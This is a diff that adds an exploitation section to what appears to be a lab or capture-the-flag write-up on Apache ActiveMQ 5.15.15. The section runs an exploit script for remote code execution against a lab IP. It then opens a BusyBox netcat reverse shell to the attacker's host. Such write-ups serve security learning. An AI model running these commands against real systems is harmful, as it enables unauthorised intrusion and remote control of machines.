@@ -130,3 +130,18 @@ The target is running Apache ActiveMQ version 5.15.15. This version is affected 
 
 ### Exploitation
 
+The vulnerability was confirmed and exploited using the following command, leading to successful remote code execution;
+```
+python3 exploit.py -i 10.129.230.87 -p 61616 -si 10.10.14.170 -sp 8080
+```
+
+![exploit](Images/exploit.png)
+
+A BusyBox reverse shell was used to upgrade the intial foothold into a more stable and interactive shell for further exploitation. 
+
+```
+busybox nc 10.10.14.170 4444 -e /bin/bash
+```
+
+![shell](Images/shell.png)
+
